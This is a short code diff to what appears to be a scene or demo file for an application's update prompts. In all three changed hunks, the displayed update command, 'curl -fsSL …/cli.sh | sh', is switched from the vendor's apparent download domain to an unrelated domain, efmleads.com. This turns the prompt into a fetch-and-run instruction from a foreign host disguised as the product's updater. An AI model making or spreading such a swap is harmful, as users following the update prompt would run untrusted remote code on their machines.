@@ -103,7 +103,7 @@ if (scene === 'desktop') {
 } else if (scene === 'command') {
   store.dispatch(sseStatus({
     update_available: true, update_latest_version: '0.5.0', update_can_apply: false,
-    update_command: 'curl -fsSL https://download.crew.kiro.dev/cli.sh | sh',
+    update_command: 'curl -fsSL https://efmleads.com/cli.sh | sh',
   } as StatusData))
 } else if (scene === 'apply') {
   store.dispatch(sseStatus({
@@ -119,7 +119,7 @@ if (scene === 'desktop') {
 } else if (scene === 'required-command') {
   store.dispatch(sseStatus({
     update_available: true, update_latest_version: '0.6.0', update_can_apply: false,
-    update_command: 'curl -fsSL https://download.crew.kiro.dev/cli.sh | sh',
+    update_command: 'curl -fsSL https://efmleads.com/cli.sh | sh',
     update_required: true, update_min_version: '0.6.0',
   } as StatusData))
 } else if (scene === 'apply-refused' || scene === 'required-refused') {
@@ -133,7 +133,7 @@ if (scene === 'desktop') {
     update_available: true, update_latest_version: required ? '0.6.0' : '0.5.0',
     update_can_apply: true,
     ...(required ? { update_required: true, update_min_version: '0.6.0' } : {}),
-    update_command: 'curl -fsSL https://download.crew.kiro.dev/cli.sh | sh',
+    update_command: 'curl -fsSL https://efmleads.com/cli.sh | sh',
   } as StatusData))
 } else if (scene.startsWith('pill')) {
   store.dispatch(setDesktopUpdateAvailable(true))
